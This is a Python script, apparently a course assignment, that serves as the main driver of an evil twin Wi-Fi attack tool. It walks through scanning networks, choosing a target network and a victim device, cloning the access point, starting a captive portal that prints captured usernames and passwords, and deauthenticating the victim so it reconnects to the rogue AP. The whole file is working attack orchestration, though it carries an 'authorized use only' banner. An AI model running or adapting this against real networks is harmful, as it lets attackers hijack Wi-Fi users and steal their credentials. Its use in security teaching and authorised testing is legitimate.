#!/usr/bin/env python3
"""
evil_twin.py – Evil Twin Attack Tool
======================================
Main entry point. Orchestrates all attack stages under a single CLI interface.

Usage:
    sudo python3 evil_twin.py

Stages:
    1. Hardware selection
    2. Network scan (60 seconds)
    3. Target selection
    4. Client (victim) discovery
    5. Evil Twin AP creation
    6. Targeted deauthentication
    7. Credential capture via Captive Portal

Requirements:
    - Two wireless interfaces (one for sniffing, one for the rogue AP)
    - Monitor mode + packet injection support on at least one interface
    - hostapd, dnsmasq installed
    - Python packages: scapy, flask
    - Must run as root (sudo)
"""

import os
import sys
import time
import signal
import subprocess

# ── Color helpers ────────────────────────────────────────────────────────────
class C:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    CYAN   = "\033[96m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"

def red(s):    return f"{C.RED}{s}{C.RESET}"
def green(s):  return f"{C.GREEN}{s}{C.RESET}"
def yellow(s): return f"{C.YELLOW}{s}{C.RESET}"
def cyan(s):   return f"{C.CYAN}{s}{C.RESET}"
def bold(s):   return f"{C.BOLD}{s}{C.RESET}"

# ── Imports from our modules ──────────────────────────────────────────────────
from scanner          import scan_networks, set_monitor_mode, Network
from client_discovery import discover_clients, set_channel,  Client
from rogue_ap         import RogueAP
from deauth           import DeauthAttack
from captive_portal   import CaptivePortal


# ──────────────────────────────────────────────
# Banner
# ──────────────────────────────────────────────

BANNER = f"""
{C.RED}{C.BOLD}
  ███████╗██╗   ██╗██╗██╗      ████████╗██╗    ██╗██╗███╗   ██╗
  ██╔════╝██║   ██║██║██║      ╚══██╔══╝██║    ██║██║████╗  ██║
  █████╗  ██║   ██║██║██║         ██║   ██║ █╗ ██║██║██╔██╗ ██║
  ██╔══╝  ╚██╗ ██╔╝██║██║         ██║   ██║███╗██║██║██║╚██╗██║
  ███████╗ ╚████╔╝ ██║███████╗    ██║   ╚███╔███╔╝██║██║ ╚████║
  ╚══════╝  ╚═══╝  ╚═╝╚══════╝    ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝
{C.RESET}
{C.YELLOW}  Wireless & Mobile Network Security – Assignment 1{C.RESET}
{C.CYAN}  For authorized use only. Educational purposes.{C.RESET}
"""


# ──────────────────────────────────────────────
# Utility: get available wireless interfaces
# ──────────────────────────────────────────────

def get_wireless_interfaces() -> list[str]:
    """Return list of wireless interface names from /proc/net/wireless."""
    try:
        with open("/proc/net/wireless") as f:
            lines = f.readlines()[2:]   # Skip header rows
        ifaces = [line.split(":")[0].strip() for line in lines if ":" in line]
        return ifaces
    except Exception:
        # Fallback: use iw dev
        try:
            out = subprocess.check_output(["iw", "dev"], text=True)
            ifaces = [line.split()[-1] for line in out.splitlines()
                      if "Interface" in line]
            return ifaces
        except Exception:
            return []


def select_interface(prompt: str, ifaces: list[str]) -> str:
    """Present a numbered list of interfaces and return the user's choice."""
    print(f"\n{bold(prompt)}")
    for i, iface in enumerate(ifaces, 1):
        print(f"  [{i}] {iface}")
    while True:
        try:
            choice = int(input(f"\n  {cyan('Select')} [1-{len(ifaces)}]: "))
            if 1 <= choice <= len(ifaces):
                return ifaces[choice - 1]
        except (ValueError, KeyboardInterrupt):
            pass
        print(red("  Invalid choice, try again."))


# ──────────────────────────────────────────────
# Stage display helpers
# ──────────────────────────────────────────────

def stage_header(n: int, title: str):
    print(f"\n{C.BOLD}{C.CYAN}{'─'*60}{C.RESET}")
    print(f"{C.BOLD}{C.CYAN}  STAGE {n}: {title}{C.RESET}")
    print(f"{C.BOLD}{C.CYAN}{'─'*60}{C.RESET}")


def print_networks_table(networks: list[Network]):
    header = f"{'#':<4} {'SSID':<28} {'BSSID':<20} {'CH':<5} {'RSSI':<8} {'SECURITY'}"
    print(f"\n{bold(header)}")
    print("─" * 75)
    for i, net in enumerate(networks, 1):
        ssid_display = net.ssid[:26] if len(net.ssid) > 26 else net.ssid
        sec_color = red if net.security == "Open" else green
        print(f"{i:<4} {ssid_display:<28} {net.bssid:<20} "
              f"{net.channel:<5} {str(net.rssi)+'dBm':<8} "
              f"{sec_color(net.security)}")
    print()


def print_clients_table(clients: list[Client]):
    header = f"{'#':<4} {'MAC Address':<20} {'Packets':<10} {'RSSI'}"
    print(f"\n{bold(header)}")
    print("─" * 45)
    for i, client in enumerate(clients, 1):
        print(f"{i:<4} {client.mac:<20} {client.pkt_count:<10} {client.rssi}dBm")
    print()


# ──────────────────────────────────────────────
# Cleanup handler
# ──────────────────────────────────────────────

_rogue_ap    = None
_deauth      = None
_portal      = None

def cleanup(sig=None, frame=None):
    print(f"\n{yellow('[*] Cleaning up...')}")
    if _deauth:
        _deauth.stop()
    if _rogue_ap:
        _rogue_ap.stop()
    if _portal:
        _portal.stop()
    print(green("[+] Cleanup complete. Exiting."))
    sys.exit(0)

signal.signal(signal.SIGINT,  cleanup)
signal.signal(signal.SIGTERM, cleanup)


# ──────────────────────────────────────────────
# Main flow
# ──────────────────────────────────────────────

def main():
    global _rogue_ap, _deauth, _portal

    # Root check
    if os.geteuid() != 0:
        print(red("[!] This tool requires root privileges. Run with sudo."))
        sys.exit(1)

    print(BANNER)

    # ── Stage 1: Hardware Selection ──────────────────────────────────────────
    stage_header(1, "Hardware Selection")

    ifaces = get_wireless_interfaces()
    if not ifaces:
        print(red("[!] No wireless interfaces found. Check your hardware."))
        sys.exit(1)

    print(f"  Found {len(ifaces)} wireless interface(s): {', '.join(ifaces)}")

    if len(ifaces) < 2:
        print(yellow("\n  [!] Warning: Only 1 interface found."))
        print(yellow("      For best results, use 2 interfaces:"))
        print(yellow("      - Interface 1: Monitor mode (sniffing & deauth)"))
        print(yellow("      - Interface 2: AP mode (Evil Twin)"))

    iface_mon = select_interface(
        "Select interface for MONITOR MODE (sniffing + deauth):", ifaces
    )

    remaining = [i for i in ifaces if i != iface_mon]
    if remaining:
        iface_ap = select_interface(
            "Select interface for ACCESS POINT (Evil Twin):", remaining
        )
    else:
        print(yellow("  [!] Using same interface for both (not ideal)."))
        iface_ap = iface_mon

    print(f"\n  {green('✓')} Monitor interface : {bold(iface_mon)}")
    print(f"  {green('✓')} AP interface      : {bold(iface_ap)}")

    # Set monitor mode
    print(f"\n  [*] Setting {iface_mon} to monitor mode...")
    if not set_monitor_mode(iface_mon):
        print(red("[!] Failed. Check interface name and permissions."))
        sys.exit(1)
    print(f"  {green('✓')} Monitor mode active on {iface_mon}")

    # ── Stage 2: Network Scan ─────────────────────────────────────────────────
    stage_header(2, "Network Discovery (60-second scan)")

    print(f"  [*] Scanning on {iface_mon} — this will take 60 seconds...")
    print(f"  [*] Channel hopping across channels 1–13\n")

    networks = scan_networks(iface_mon, duration=60)

    if not networks:
        print(red("[!] No networks found. Check monitor mode and range."))
        sys.exit(1)

    print(f"  {green('✓')} Found {len(networks)} network(s):")
    print_networks_table(networks)

    # ── Stage 3: Target Selection ─────────────────────────────────────────────
    stage_header(3, "Target Selection")

    while True:
        try:
            choice = int(input(f"  {cyan('Select target network')} [1-{len(networks)}]: "))
            if 1 <= choice <= len(networks):
                target = networks[choice - 1]
                break
        except (ValueError, KeyboardInterrupt):
            cleanup()
        print(red("  Invalid choice."))

    print(f"\n  {green('✓')} Target selected:")
    print(f"      SSID    : {bold(target.ssid)}")
    print(f"      BSSID   : {target.bssid}")
    print(f"      Channel : {target.channel}")
    print(f"      Security: {target.security}")

    # ── Stage 4: Client Discovery ─────────────────────────────────────────────
    stage_header(4, "Client (Victim) Discovery")

    print(f"  [*] Locking to channel {target.channel}...")
    set_channel(iface_mon, target.channel)

    print(f"  [*] Scanning for clients on '{target.ssid}' (30 seconds)...\n")
    clients = discover_clients(iface_mon, target.bssid, target.channel, duration=30)

    if not clients:
        print(yellow("  [!] No active clients found."))
        print(yellow("      The network may be idle. Try again or choose another target."))
        cleanup()

    print(f"  {green('✓')} Found {len(clients)} client(s):")
    print_clients_table(clients)

    while True:
        try:
            choice = int(input(f"  {cyan('Select victim')} [1-{len(clients)}]: "))
            if 1 <= choice <= len(clients):
                victim = clients[choice - 1]
                break
        except (ValueError, KeyboardInterrupt):
            cleanup()
        print(red("  Invalid choice."))

    print(f"\n  {green('✓')} Victim selected: {bold(victim.mac)}")

    # ── Stage 5: Evil Twin AP ─────────────────────────────────────────────────
    stage_header(5, "Launching Evil Twin AP")

    _rogue_ap = RogueAP(
        iface_ap=iface_ap,
        ssid=target.ssid,
        bssid=target.bssid,
        channel=target.channel
    )
    _rogue_ap.start()

    # ── Stage 6: Captive Portal ───────────────────────────────────────────────
    stage_header(6, "Starting Captive Portal")

    def on_creds(ip, username, password):
        print(f"\n{C.RED}{C.BOLD}  [!!!] CREDENTIALS CAPTURED from {ip}{C.RESET}")
        print(f"  Username : {bold(username)}")
        print(f"  Password : {bold(password)}\n")

    _portal = CaptivePortal(on_credentials=on_creds)
    _portal.start()

    # ── Stage 7: Deauthentication ─────────────────────────────────────────────
    stage_header(7, "Targeted Deauthentication")

    print(f"  [*] Sending Deauth frames to {victim.mac}")
    print(f"  [*] Victim should disconnect from '{target.ssid}' and")
    print(f"      reconnect to our Evil Twin...\n")

    _deauth = DeauthAttack(
        iface=iface_mon,
        client_mac=victim.mac,
        ap_bssid=target.bssid
    )
    _deauth.start()

    # ── Monitor & Wait ────────────────────────────────────────────────────────
    print(f"\n{bold('─'*60)}")
    print(f"{bold('  Attack is running. Waiting for victim to connect...')}")
    print(f"{bold('  Press Ctrl+C to stop cleanly.')}")
    print(f"{bold('─'*60)}\n")

    while True:
        time.sleep(5)

        # Check if we captured credentials
        creds = _portal.get_captured()
        if creds:
            latest = creds[-1]
            print(f"  {green('[+]')} Credential count: {len(creds)} | "
                  f"Latest from {latest['ip']} at {latest['time']}")

        # Status line
        ap_ok = _rogue_ap.is_running()
        de_ok = _deauth.is_running()
        print(f"  Status → AP: {'UP' if ap_ok else red('DOWN')}  "
              f"| Deauth: {'RUNNING' if de_ok else red('STOPPED')}  "
              f"| Creds captured: {len(creds)}")


if __name__ == "__main__":
    main()
